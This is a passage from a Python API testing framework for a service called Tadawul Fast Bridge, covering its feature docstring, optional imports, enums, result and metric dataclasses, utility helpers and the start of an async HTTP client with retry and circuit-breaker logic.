#!/usr/bin/env python3
"""
TADAWUL FAST BRIDGE – ENTERPRISE API TEST SUITE (v5.0.0)
===========================================================
Comprehensive API Testing Framework with Advanced Diagnostics

Core Capabilities
-----------------
• Multi-environment testing (dev/staging/production) with environment detection
• Advanced security auditing (auth, rate limiting, CORS, JWT, OWASP Top 10)
• Performance benchmarking with percentile analysis and trend detection
• Schema validation against OpenAPI/Swagger specifications
• Load testing with configurable concurrency and user behavior simulation
• Chaos engineering experiments (latency injection, failure injection, circuit breaker testing)
• Compliance checking (GDPR, SOC2, ISO27001, HIPAA, PCI-DSS)
• Historical trend analysis with statistical significance testing
• WebSocket testing (real-time feeds, subscriptions, latency)
• Database integration testing with connection pooling and query analysis
• Cache validation and hit-rate analysis with Redis/Memcached support
• Circuit breaker verification and resilience testing
• Rate limit validation and bypass detection
• CORS misconfiguration detection
• JWT token security analysis (algorithm confusion, weak secrets, expiration)
• SQL injection and XSS vulnerability scanning
• TLS/SSL configuration auditing
• API versioning compatibility testing
• Response time degradation detection
• Memory leak detection through endpoint profiling
• Distributed tracing validation (OpenTelemetry, Jaeger)
• Service mesh compatibility testing (Istio, Linkerd)
• Kubernetes liveness/readiness probe validation
• Documentation accuracy verification
• Backward compatibility testing
• Contract testing with OpenAPI/Swagger
• Mutation testing for API robustness

Exit Codes
----------
0: All tests passed
1: Configuration/Setup error
2: Critical failures detected
3: Non-critical failures
4: Performance degradation detected
5: Security vulnerabilities found
6: Schema validation failed
7: Rate limit exceeded
8: Compliance violation detected
9: Database error
10: WebSocket error

Usage Examples
--------------
# Basic smoke test
python tests/test_endpoints.py --url https://api.tadawulfb.com

# Comprehensive security audit
python tests/test_endpoints.py --security-audit --owasp --scan-vulnerabilities

# Performance benchmark with historical comparison
python tests/test_endpoints.py --benchmark --concurrency 50 --duration 60 --compare-with baseline.json

# Load test with custom user behavior
python tests/test_endpoints.py --load-test --users 100 --spawn-rate 10 --run-time 5m --scenario mixed

# Schema validation against OpenAPI
python tests/test_endpoints.py --validate-schema --openapi spec.yaml --strict-validation

# Compliance check with detailed reporting
python tests/test_endpoints.py --compliance --standard soc2,gdpr --output compliance.html

# Continuous monitoring with alerts
python tests/test_endpoints.py --monitor --interval 300 --webhook https://hooks.slack.com/... --threshold p95=500

# Chaos testing with gradual degradation
python tests/test_endpoints.py --chaos --failure-rate 0.1 --latency-ms 1000 --circuit-breaker-test

# Database integration testing
python tests/test_endpoints.py --database --query-perf --connection-pool-test

# WebSocket real-time feed testing
python tests/test_endpoints.py --websocket --subscribe AAPL,MSFT --latency-test

# Cache performance analysis
python tests/test_endpoints.py --cache-test --hit-ratio --ttl-validation

# Kubernetes readiness validation
python tests/test_endpoints.py --k8s-probes --readiness-path /ready --liveness-path /live

# Contract testing with consumer-driven contracts
python tests/test_endpoints.py --contract --provider pact.json --consumer api-client

# Mutation testing for API robustness
python tests/test_endpoints.py --mutation --mutations invalid-json,malformed-xss,oversized-payload

# Historical trend analysis
python tests/test_endpoints.py --trend --days 30 --metric response_time --alert-threshold 1.5

Architecture
------------
┌─────────────────────────────────────────────────────────────────┐
│                        Test Runner                               │
│  • Test discovery       • Result aggregation   • Reporting      │
│  • Concurrency control  • Timeout handling     • Exit codes     │
└─────────────────────────────────────────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐   ┌───────────────┐   ┌───────────────┐
│  HTTP Client  │   │  WebSocket    │   │  Database     │
│  • Retries    │   │  • Real-time  │   │  • Pool test  │
│  • Circuit    │   │  • Subscriber │   │  • Query perf │
│  • Metrics    │   │  • Latency    │   │  • Integrity  │
└───────────────┘   └───────────────┘   └───────────────┘
        │                   │                   │
        ▼                   ▼                   ▼
┌───────────────┐   ┌───────────────┐   ┌───────────────┐
│  Security     │   │  Performance  │   │  Compliance   │
│  Auditor      │   │  Analyzer     │   │  Checker      │
│  • OWASP      │   │  • Percentiles│   │  • GDPR       │
│  • JWT        │   │  • Trends     │   │  • SOC2       │
│  • CORS       │   │  • Thresholds │   │  • HIPAA      │
└───────────────┘   └───────────────┘   └───────────────┘

Performance Characteristics
--------------------------
• Single test execution: < 100ms per endpoint
• Full suite run (100 endpoints): < 10 seconds
• Load test capacity: 10,000+ RPS
• Memory footprint: 50-200MB depending on concurrency
• Concurrent connections: 1000+ with connection pooling
• WebSocket connections: 100+ simultaneous

Integration with External Systems
--------------------------------
• Prometheus metrics export
• Grafana dashboards
• Slack/Teams alerts
• PagerDuty integration
• Jira issue creation
• Elasticsearch logging
• Datadog APM tracing
• New Relic insights
• AWS CloudWatch metrics
• Azure Monitor
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import csv
import hashlib
import hmac
import io
import ipaddress
import json
import logging
import logging.config
import os
import random
import re
import signal
import socket
import ssl
import sys
import time
import uuid
import warnings
import xml.etree.ElementTree as ET
from collections import Counter, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import asynccontextmanager, contextmanager, suppress
from dataclasses import asdict, dataclass, field, replace
from datetime import datetime, timedelta, timezone
from enum import Enum
from functools import lru_cache, partial, wraps
from http.cookiejar import CookieJar
from pathlib import Path
from threading import Event, Lock, Thread
from typing import (Any, AsyncGenerator, Callable, Dict, List, Optional,
                    Set, Tuple, Type, TypeVar, Union, cast, overload)
from urllib.parse import parse_qs, urlencode, urljoin, urlparse
import math

# =============================================================================
# Version & Core Configuration
# =============================================================================
SCRIPT_VERSION = "5.0.0"
SCRIPT_NAME = "Enterprise API Test Suite"
MIN_PYTHON = (3, 9)

if sys.version_info < MIN_PYTHON:
    sys.exit(f"❌ Python {MIN_PYTHON[0]}.{MIN_PYTHON[1]}+ required")

# =============================================================================
# Optional Dependencies with Graceful Degradation
# =============================================================================
# HTTP/Networking
try:
    import aiohttp
    import aiohttp.client_exceptions
    import aiohttp.web
    from aiohttp import ClientTimeout, TCPConnector, ClientSession
    from aiohttp.client import ClientResponse
    from aiohttp.client_reqrep import ClientRequest
    from aiohttp.connector import Connection
    from aiohttp.helpers import TimerNoop
    from yarl import URL
    ASYNC_HTTP_AVAILABLE = True
except ImportError:
    aiohttp = None
    ASYNC_HTTP_AVAILABLE = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None
    REQUESTS_AVAILABLE = False

# Performance/Load Testing
try:
    from locust import HttpUser, task, between, constant, constant_pacing
    from locust.env import Environment
    from locust.stats import stats_printer, stats_history
    from locust.log import setup_logging
    from locust.exception import StopUser
    from locust.runners import MasterRunner, WorkerRunner
    LOCUST_AVAILABLE = True
except ImportError:
    LOCUST_AVAILABLE = False

# Data Processing
try:
    import numpy as np
    from numpy import random as nprand
    from numpy.fft import fft, ifft
    NUMPY_AVAILABLE = True
except ImportError:
    np = None
    NUMPY_AVAILABLE = False

try:
    import pandas as pd
    from pandas import DataFrame, Series
    from pandas.plotting import autocorrelation_plot
    PANDAS_AVAILABLE = True
except ImportError:
    pd = None
    PANDAS_AVAILABLE = False

try:
    from scipy import stats
    from scipy.stats import percentileofscore, norm, ttest_ind, mannwhitneyu
    from scipy.signal import find_peaks
    SCIPY_AVAILABLE = True
except ImportError:
    stats = None
    SCIPY_AVAILABLE = False

# Schema Validation
try:
    import jsonschema
    from jsonschema import validate, Draft7Validator, ValidationError
    from jsonschema.exceptions import best_match
    JSONSCHEMA_AVAILABLE = True
except ImportError:
    jsonschema = None
    JSONSCHEMA_AVAILABLE = False

try:
    import yaml
    from yaml.loader import SafeLoader
    from yaml.dumper import SafeDumper
    YAML_AVAILABLE = True
except ImportError:
    yaml = None
    YAML_AVAILABLE = False

# OpenAPI/Swagger
try:
    import prance
    from prance import ResolvingParser
    from prance.util import ValidationError
    from prance.util.url import ResolutionError
    from prance.util.resolver import RefResolver
    PRANCE_AVAILABLE = True
except ImportError:
    prance = None
    PRANCE_AVAILABLE = False

# Security
try:
    import jwt
    from jwt import PyJWTError
    from jwt.algorithms import RSAAlgorithm, HMACAlgorithm, NoneAlgorithm
    JWT_AVAILABLE = True
except ImportError:
    jwt = None
    JWT_AVAILABLE = False

try:
    import cryptography
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives.serialization import load_pem_private_key
    from cryptography.x509 import load_pem_x509_certificate
    CRYPTO_AVAILABLE = True
except ImportError:
    cryptography = None
    CRYPTO_AVAILABLE = False

try:
    from OpenSSL import SSL, crypto
    PYOPENSSL_AVAILABLE = True
except ImportError:
    PYOPENSSL_AVAILABLE = False

try:
    import sslyze
    from sslyze.server_connectivity import ServerConnectivityTester
    from sslyze.scanner import Scanner
    SSLYZE_AVAILABLE = True
except ImportError:
    sslyze = None
    SSLYZE_AVAILABLE = False

# WebSocket
try:
    import websockets
    from websockets.exceptions import ConnectionClosed, WebSocketException
    WEBSOCKET_AVAILABLE = True
except ImportError:
    websockets = None
    WEBSOCKET_AVAILABLE = False

# Reporting
try:
    import matplotlib
    matplotlib.use('Agg')
    import matplotlib.pyplot as plt
    import matplotlib.dates as mdates
    from matplotlib.figure import Figure
    from matplotlib.axes import Axes
    from matplotlib.backends.backend_pdf import PdfPages
    PLOT_AVAILABLE = True
except ImportError:
    plt = None
    PLOT_AVAILABLE = False

try:
    import seaborn as sns
    SEABORN_AVAILABLE = True
except ImportError:
    sns = None
    SEABORN_AVAILABLE = False

try:
    from jinja2 import Template, Environment as JinjaEnvironment
    JINJA_AVAILABLE = True
except ImportError:
    JINJA_AVAILABLE = False

# Database
try:
    from sqlalchemy import create_engine, text, inspect
    from sqlalchemy.pool import QueuePool, NullPool
    from sqlalchemy.exc import SQLAlchemyError
    SQLALCHEMY_AVAILABLE = True
except ImportError:
    SQLALCHEMY_AVAILABLE = False

try:
    import redis
    from redis.exceptions import RedisError
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False

try:
    import aioredis
    AIOREDIS_AVAILABLE = True
except ImportError:
    AIOREDIS_AVAILABLE = False

# Monitoring
try:
    from prometheus_client import Counter, Gauge, Histogram, Summary
    from prometheus_client.exposition import generate_latest
    PROMETHEUS_AVAILABLE = True
except ImportError:
    PROMETHEUS_AVAILABLE = False

try:
    from opentelemetry import trace, metrics
    from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.metrics import MeterProvider
    OPENTELEMETRY_AVAILABLE = True
except ImportError:
    OPENTELEMETRY_AVAILABLE = False

# =============================================================================
# Logging Configuration
# =============================================================================
LOG_FORMAT = "%(asctime)s | %(levelname)8s | %(name)s | %(message)s"
DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

logging.basicConfig(level=logging.INFO, format=LOG_FORMAT, datefmt=DATE_FORMAT)
logger = logging.getLogger("APITest")

# =============================================================================
# Enums & Advanced Types
# =============================================================================
class TestSeverity(Enum):
    """Test severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"
    
    @property
    def exit_code(self) -> int:
        """Get exit code for severity"""
        return {
            TestSeverity.CRITICAL: 2,
            TestSeverity.HIGH: 3,
            TestSeverity.MEDIUM: 4,
            TestSeverity.LOW: 0,
            TestSeverity.INFO: 0
        }[self]

class TestCategory(Enum):
    """Test categories"""
    INFRASTRUCTURE = "infrastructure"
    SECURITY = "security"
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    DATA_VALIDITY = "data_validity"
    PERFORMANCE = "performance"
    LOAD = "load"
    CHAOS = "chaos"
    COMPLIANCE = "compliance"
    INTEGRATION = "integration"
    WEBSOCKET = "websocket"
    CACHE = "cache"
    DATABASE = "database"
    RESILIENCE = "resilience"
    OBSERVABILITY = "observability"
    CONTRACT = "contract"
    MUTATION = "mutation"
    DOCUMENTATION = "documentation"

class HTTPMethod(Enum):
    """HTTP methods"""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    PATCH = "PATCH"
    HEAD = "HEAD"
    OPTIONS = "OPTIONS"
    TRACE = "TRACE"
    CONNECT = "CONNECT"
    
    @property
    def is_safe(self) -> bool:
        """Check if method is safe (idempotent)"""
        return self in {HTTPMethod.GET, HTTPMethod.HEAD, HTTPMethod.OPTIONS, HTTPMethod.TRACE}
    
    @property
    def is_idempotent(self) -> bool:
        """Check if method is idempotent"""
        return self in {HTTPMethod.GET, HTTPMethod.HEAD, HTTPMethod.OPTIONS, 
                        HTTPMethod.TRACE, HTTPMethod.PUT, HTTPMethod.DELETE}

class AuthType(Enum):
    """Authentication types"""
    NONE = "none"
    BEARER = "bearer"
    API_KEY = "api_key"
    BASIC = "basic"
    JWT = "jwt"
    OAUTH2 = "oauth2"
    OAUTH2_CLIENT_CREDENTIALS = "oauth2_client_credentials"
    OAUTH2_PASSWORD = "oauth2_password"
    OAUTH2_AUTHORIZATION_CODE = "oauth2_authorization_code"
    OPENID_CONNECT = "openid_connect"
    SAML = "saml"
    API_KEY_HEADER = "api_key_header"
    API_KEY_QUERY = "api_key_query"
    API_KEY_COOKIE = "api_key_cookie"

class TestStatus(Enum):
    """Test result status"""
    PASS = "PASS"
    FAIL = "FAIL"
    WARN = "WARN"
    SKIP = "SKIP"
    ERROR = "ERROR"

class ComplianceStandard(Enum):
    """Compliance standards"""
    GDPR = "gdpr"
    SOC2 = "soc2"
    HIPAA = "hipaa"
    PCI_DSS = "pci_dss"
    ISO27001 = "iso27001"
    ISO27017 = "iso27017"
    ISO27018 = "iso27018"
    NIST = "nist"
    NIST_800_53 = "nist_800_53"
    NIST_CSF = "nist_csf"
    CCPA = "ccpa"
    COPPA = "coppa"
    FERPA = "ferpa"
    GLBA = "glba"
    SOX = "sox"
    FISMA = "fisma"
    FEDRAMP = "fedramp"
    CSA_STAR = "csa_star"
    APRA = "apra"
    MAS = "mas"
    CBUAE = "cb-uae"
    SAMA = "sama"
    NCA = "nca"
    PDPL = "pdpl"
    
    @property
    def regulations(self) -> List[str]:
        """Get associated regulations"""
        return {
            ComplianceStandard.GDPR: ['GDPR', 'DSGVO'],
            ComplianceStandard.HIPAA: ['HIPAA', 'HITECH'],
            ComplianceStandard.PCI_DSS: ['PCI DSS', 'PA-DSS'],
            ComplianceStandard.SAMA: ['SAMA', 'CSF'],
            ComplianceStandard.NCA: ['NCA', 'ECC'],
            ComplianceStandard.PDPL: ['PDPL'],
        }.get(self, [])

class VulnerabilityType(Enum):
    """Security vulnerability types (OWASP Top 10)"""
    # OWASP Top 10 2021
    BROKEN_ACCESS_CONTROL = "A01:2021-Broken Access Control"
    CRYPTOGRAPHIC_FAILURES = "A02:2021-Cryptographic Failures"
    INJECTION = "A03:2021-Injection"
    INSECURE_DESIGN = "A04:2021-Insecure Design"
    SECURITY_MISCONFIGURATION = "A05:2021-Security Misconfiguration"
    VULNERABLE_COMPONENTS = "A06:2021-Vulnerable and Outdated Components"
    IDENTIFICATION_FAILURES = "A07:2021-Identification and Authentication Failures"
    SOFTWARE_DATA_INTEGRITY = "A08:2021-Software and Data Integrity Failures"
    SECURITY_LOGGING_FAILURES = "A09:2021-Security Logging and Monitoring Failures"
    SSRF = "A10:2021-Server-Side Request Forgery"
    
    # Additional
    RATE_LIMITING_FAILURE = "API4:2019-Lack of Resources & Rate Limiting"
    MASS_ASSIGNMENT = "API6:2019-Mass Assignment"
    SECURITY_MISCONFIGURATION_API = "API7:2019-Security Misconfiguration"
    INJECTION_API = "API8:2019-Injection"
    IMPROPER_ASSETS_MANAGEMENT = "API9:2019-Improper Assets Management"
    EXCESSIVE_DATA_EXPOSURE = "API3:2019-Excessive Data Exposure"

# =============================================================================
# Data Models
# =============================================================================
@dataclass
class TestEndpoint:
    """API endpoint definition"""
    name: str
    path: str
    method: HTTPMethod
    category: TestCategory
    severity: TestSeverity
    expected_status: int = 200
    auth_required: bool = True
    rate_limited: bool = False
    cacheable: bool = False
    timeout: float = 10.0
    payload: Optional[Dict[str, Any]] = None
    params: Optional[Union[Dict[str, Any], List[Tuple[str, str]]]] = None
    headers: Optional[Dict[str, str]] = None
    validation_schema: Optional[Dict[str, Any]] = None
    tags: List[str] = field(default_factory=list)
    weight: float = 1.0  # For load testing
    dependencies: List[str] = field(default_factory=list)  # Endpoints that must pass first
    
    @property
    def full_path(self) -> str:
        """Get full path with leading slash"""
        return f"/{self.path.lstrip('/')}"
    
    def get_params_dict(self) -> Dict[str, str]:
        """Get params as dictionary"""
        if isinstance(self.params, dict):
            return self.params
        elif isinstance(self.params, list):
            return dict(self.params)
        return {}
    
    def interpolate(self, **kwargs) -> TestEndpoint:
        """Interpolate path variables"""
        path = self.path
        for key, value in kwargs.items():
            path = path.replace(f"{{{key}}}", str(value))
        
        return replace(self, path=path)

@dataclass
class TestResult:
    """Individual test result"""
    endpoint: str
    method: str
    status: TestStatus
    severity: TestSeverity
    category: TestCategory
    response_time: float
    http_status: int
    timestamp: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    message: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    expected_status: Optional[int] = None
    validation_errors: List[str] = field(default_factory=list)
    response_size: int = 0
    request_id: Optional[str] = None
    trace_id: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'endpoint': self.endpoint,
            'method': self.method,
            'status': self.status.value,
            'severity': self.severity.value,
            'category': self.category.value,
            'response_time_ms': round(self.response_time * 1000, 2),
            'http_status': self.http_status,
            'timestamp': self.timestamp.isoformat(),
            'message': self.message,
            'details': self.details,
            'expected_status': self.expected_status,
            'validation_errors': self.validation_errors,
            'response_size': self.response_size,
            'request_id': self.request_id,
            'trace_id': self.trace_id
        }

@dataclass
class TestSuite:
    """Collection of test results"""
    name: str
    version: str = SCRIPT_VERSION
    start_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    end_time: Optional[datetime] = None
    results: List[TestResult] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    environment: str = "unknown"
    target_url: str = ""
    
    def add_result(self, result: TestResult):
        """Add test result"""
        self.results.append(result)
    
    @property
    def duration(self) -> float:
        """Get test duration in seconds"""
        end = self.end_time or datetime.now(timezone.utc)
        return (end - self.start_time).total_seconds()
    
    @property
    def summary(self) -> Dict[str, Any]:
        """Generate test summary"""
        total = len(self.results)
        by_status = Counter(r.status.value for r in self.results)
        by_category = Counter(r.category.value for r in self.results)
        by_severity = Counter(r.severity.value for r in self.results)
        
        response_times = [r.response_time for r in self.results if r.response_time > 0]
        response_sizes = [r.response_size for r in self.results if r.response_size > 0]
        
        return {
            'total': total,
            'passed': by_status.get('PASS', 0),
            'failed': by_status.get('FAIL', 0),
            'warned': by_status.get('WARN', 0),
            'skipped': by_status.get('SKIP', 0),
            'errors': by_status.get('ERROR', 0),
            'by_category': dict(by_category),
            'by_severity': dict(by_severity),
            'response_times': {
                'min': min(response_times) if response_times else 0,
                'max': max(response_times) if response_times else 0,
                'avg': sum(response_times) / len(response_times) if response_times else 0,
                'median': self._percentile(response_times, 50) if response_times else 0,
                'p95': self._percentile(response_times, 95) if response_times else 0,
                'p99': self._percentile(response_times, 99) if response_times else 0,
                'p999': self._percentile(response_times, 99.9) if response_times else 0,
                'std_dev': self._std_dev(response_times) if response_times else 0
            },
            'response_sizes': {
                'min': min(response_sizes) if response_sizes else 0,
                'max': max(response_sizes) if response_sizes else 0,
                'avg': sum(response_sizes) / len(response_sizes) if response_sizes else 0,
                'total': sum(response_sizes) if response_sizes else 0
            },
            'duration': self.duration
        }
    
    def _percentile(self, data: List[float], percentile: float) -> float:
        """Calculate percentile"""
        if not data:
            return 0.0
        if NUMPY_AVAILABLE:
            return float(np.percentile(data, percentile))
        else:
            sorted_data = sorted(data)
            k = (len(sorted_data) - 1) * percentile / 100
            f = math.floor(k)
            c = math.ceil(k)
            if f == c:
                return sorted_data[int(k)]
            d0 = sorted_data[int(f)] * (c - k)
            d1 = sorted_data[int(c)] * (k - f)
            return d0 + d1
    
    def _std_dev(self, data: List[float]) -> float:
        """Calculate standard deviation"""
        if len(data) < 2:
            return 0.0
        if NUMPY_AVAILABLE:
            return float(np.std(data))
        else:
            mean = sum(data) / len(data)
            variance = sum((x - mean) ** 2 for x in data) / (len(data) - 1)
            return math.sqrt(variance)
    
    def to_json(self) -> str:
        """Convert to JSON"""
        return json.dumps({
            'name': self.name,
            'version': self.version,
            'start_time': self.start_time.isoformat(),
            'end_time': self.end_time.isoformat() if self.end_time else None,
            'duration': self.duration,
            'environment': self.environment,
            'target_url': self.target_url,
            'summary': self.summary,
            'results': [r.to_dict() for r in self.results],
            'metadata': self.metadata
        }, indent=2, default=str)

@dataclass
class PerformanceMetrics:
    """Performance metrics for an endpoint"""
    endpoint: str
    method: str
    samples: int
    min_time: float
    max_time: float
    avg_time: float
    median_time: float
    p95_time: float
    p99_time: float
    p999_time: float
    std_dev: float
    error_rate: float
    throughput: float  # requests per second
    timestamp: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'endpoint': self.endpoint,
            'method': self.method,
            'samples': self.samples,
            'min_time_ms': round(self.min_time * 1000, 2),
            'max_time_ms': round(self.max_time * 1000, 2),
            'avg_time_ms': round(self.avg_time * 1000, 2),
            'median_time_ms': round(self.median_time * 1000, 2),
            'p95_time_ms': round(self.p95_time * 1000, 2),
            'p99_time_ms': round(self.p99_time * 1000, 2),
            'p999_time_ms': round(self.p999_time * 1000, 2),
            'std_dev_ms': round(self.std_dev * 1000, 2),
            'error_rate': round(self.error_rate * 100, 2),
            'throughput_rps': round(self.throughput, 2)
        }

@dataclass
class SecurityVulnerability:
    """Security vulnerability found"""
    type: Union[VulnerabilityType, str]
    severity: TestSeverity
    endpoint: str
    description: str
    remediation: str
    cve: Optional[str] = None
    cvss_score: Optional[float] = None
    cvss_vector: Optional[str] = None
    evidence: Optional[Dict[str, Any]] = None
    owasp_category: Optional[VulnerabilityType] = None
    references: List[str] = field(default_factory=list)

@dataclass
class ComplianceFinding:
    """Compliance finding"""
    standard: ComplianceStandard
    requirement: str
    status: TestStatus
    description: str
    remediation: Optional[str] = None
    evidence: Optional[Dict[str, Any]] = None

@dataclass
class CacheMetrics:
    """Cache performance metrics"""
    endpoint: str
    hits: int
    misses: int
    hit_ratio: float
    avg_response_time_hit: float
    avg_response_time_miss: float
    improvement_factor: float
    ttl_violations: int
    stale_served: int

@dataclass
class HistoricalTrend:
    """Historical performance trend"""
    metric: str
    values: List[float]
    timestamps: List[datetime]
    slope: float
    intercept: float
    r_squared: float
    p_value: float
    is_significant: bool
    percent_change: float
    forecast_next: float
    anomaly_indices: List[int]

# =============================================================================
# Utilities
# =============================================================================
class Colors:
    """ANSI color codes"""
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_YELLOW = "\033[43m"
    BG_BLUE = "\033[44m"

def colorize(text: str, color: str, bold: bool = False, background: bool = False) -> str:
    """Colorize text for terminal output"""
    if not sys.stdout.isatty():
        return text
    prefix = color
    if bold:
        prefix += Colors.BOLD
    return f"{prefix}{text}{Colors.END}"

def format_duration(seconds: float) -> str:
    """Format duration in human-readable format"""
    if seconds < 0.001:
        return f"{seconds * 1000000:.0f}µs"
    if seconds < 1:
        return f"{seconds * 1000:.2f}ms"
    if seconds < 60:
        return f"{seconds:.2f}s"
    minutes = int(seconds // 60)
    secs = seconds % 60
    hours = int(minutes // 60)
    minutes = minutes % 60
    
    if hours > 0:
        return f"{hours}h {minutes}m {secs:.1f}s"
    elif minutes > 0:
        return f"{minutes}m {secs:.1f}s"
    else:
        return f"{secs:.1f}s"

def format_size(bytes_: int) -> str:
    """Format size in human-readable format"""
    if bytes_ < 1024:
        return f"{bytes_:.0f}B"
    if bytes_ < 1024 ** 2:
        return f"{bytes_ / 1024:.1f}KB"
    if bytes_ < 1024 ** 3:
        return f"{bytes_ / (1024 ** 2):.1f}MB"
    return f"{bytes_ / (1024 ** 3):.1f}GB"

def parse_timestamp(ts: str) -> Optional[datetime]:
    """Parse timestamp in various formats"""
    formats = [
        '%Y-%m-%dT%H:%M:%S.%fZ',
        '%Y-%m-%dT%H:%M:%S.%f%z',
        '%Y-%m-%dT%H:%M:%SZ',
        '%Y-%m-%d %H:%M:%S',
        '%Y-%m-%d %H:%M:%S.%f',
        '%Y-%m-%d',
        '%d/%m/%Y %H:%M:%S',
        '%d/%m/%Y',
        '%m/%d/%Y %H:%M:%S',
        '%m/%d/%Y',
    ]
    
    for fmt in formats:
        try:
            dt = datetime.strptime(ts, fmt)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return dt
        except ValueError:
            continue
    return None

def extract_json_from_response(text: str) -> Optional[Union[Dict, List]]:
    """Extract JSON from response text (handles leading/trailing text)"""
    # Find JSON object
    start = text.find('{')
    end = text.rfind('}') + 1
    
    if start >= 0 and end > start:
        json_str = text[start:end]
        try:
            return json.loads(json_str)
        except:
            pass
    
    # Find JSON array
    start = text.find('[')
    end = text.rfind(']') + 1
    
    if start >= 0 and end > start:
        json_str = text[start:end]
        try:
            return json.loads(json_str)
        except:
            pass
    
    return None

def calculate_entropy(data: str) -> float:
    """Calculate Shannon entropy of string"""
    if not data:
        return 0.0
    
    entropy = 0.0
    for x in range(256):
        p_x = float(data.count(chr(x))) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log2(p_x)
    
    return entropy

def is_strong_password(password: str) -> Tuple[bool, List[str]]:
    """Check password strength"""
    issues = []
    
    if len(password) < 12:
        issues.append("Too short (min 12 chars)")
    if not re.search(r'[A-Z]', password):
        issues.append("Missing uppercase letter")
    if not re.search(r'[a-z]', password):
        issues.append("Missing lowercase letter")
    if not re.search(r'[0-9]', password):
        issues.append("Missing digit")
    if not re.search(r'[^A-Za-z0-9]', password):
        issues.append("Missing special character")
    if re.search(r'(.)\1{3,}', password):
        issues.append("Contains repeated characters")
    if password.lower() in {'password', '123456', 'qwerty', 'admin', 'letmein'}:
        issues.append("Common password")
    
    entropy = calculate_entropy(password)
    if entropy < 3.0:
        issues.append(f"Low entropy ({entropy:.2f})")
    
    return len(issues) == 0, issues

def detect_encoding(data: bytes) -> str:
    """Detect text encoding"""
    encodings = ['utf-8', 'latin-1', 'ascii', 'cp1252', 'iso-8859-1']
    
    for encoding in encodings:
        try:
            data.decode(encoding)
            return encoding
        except UnicodeDecodeError:
            continue
    
    return 'unknown'

def sanitize_filename(filename: str) -> str:
    """Sanitize filename for safe filesystem usage"""
    # Remove path separators
    filename = filename.replace('/', '_').replace('\\', '_')
    
    # Remove dangerous characters
    filename = re.sub(r'[<>:"|?*]', '_', filename)
    
    # Limit length
    if len(filename) > 200:
        name, ext = os.path.splitext(filename)
        filename = name[:200-len(ext)] + ext
    
    return filename

# =============================================================================
# Async HTTP Client with Advanced Features
# =============================================================================
class AsyncHTTPClient:
    """Advanced async HTTP client with retries, circuit breaker, and monitoring"""
    
    def __init__(self, base_url: str, timeout: float = 30.0, max_retries: int = 3,
                 verify_ssl: bool = True, follow_redirects: bool = True,
                 max_connections: int = 100, connection_ttl: int = 300):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.max_retries = max_retries
        self.verify_ssl = verify_ssl
        self.follow_redirects = follow_redirects
        self.max_connections = max_connections
        self.connection_ttl = connection_ttl
        self.session: Optional[ClientSession] = None
        self.metrics: Dict[str, List[float]] = defaultdict(list)
        self.error_counts: Dict[str, int] = defaultdict(int)
        self.circuit_breakers: Dict[str, Dict[str, Any]] = {}
        self._lock = asyncio.Lock()
        self._request_id_counter = 0
        self._active_requests: Dict[str, asyncio.Task] = {}
    
    async def __aenter__(self):
        if ASYNC_HTTP_AVAILABLE:
            connector = TCPConnector(
                limit=self.max_connections,
                limit_per_host=self.max_connections // 10,
                ttl_dns_cache=self.connection_ttl,
                ssl=False if not self.verify_ssl else None,
                force_close=False,
                enable_cleanup_closed=True
            )
            
            timeout_settings = ClientTimeout(
                total=self.timeout,
                connect=self.timeout / 2,
                sock_read=self.timeout,
                sock_connect=self.timeout / 2
            )
            
            self.session = ClientSession(
                connector=connector,
                timeout=timeout_settings,
                raise_for_status=False
            )
        return self
    
    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()
            
            # Cancel any active requests
            for task in self._active_requests.values():
                task.cancel()
    
    def _generate_request_id(self) -> str:
        """Generate unique request ID"""
        self._request_id_counter += 1
        return f"req-{int(time.time())}-{self._request_id_counter}-{uuid.uuid4().hex[:8]}"
    
    async def request(self, method: str, path: str, **kwargs) -> Tuple[int, Any, float, Dict[str, Any], str]:
        """Make HTTP request with retries and circuit breaker"""
        url = urljoin(self.base_url, path.lstrip('/'))
        request_id = self._generate_request_id()
        
        # Check circuit breaker
        circuit_key = f"{method}:{path}"
        async with self._lock:
            if circuit_key in self.circuit_breakers:
                cb = self.circuit_breakers[circuit_key]
                if cb['state'] == 'open':
                    if datetime.now() > cb['reset_at']:
                        cb['state'] = 'half-open'
                        cb['failures'] = 0
                        cb['successes'] = 0
                    else:
                        raise Exception(f"Circuit breaker open for {circuit_key}")
        
        # Default headers
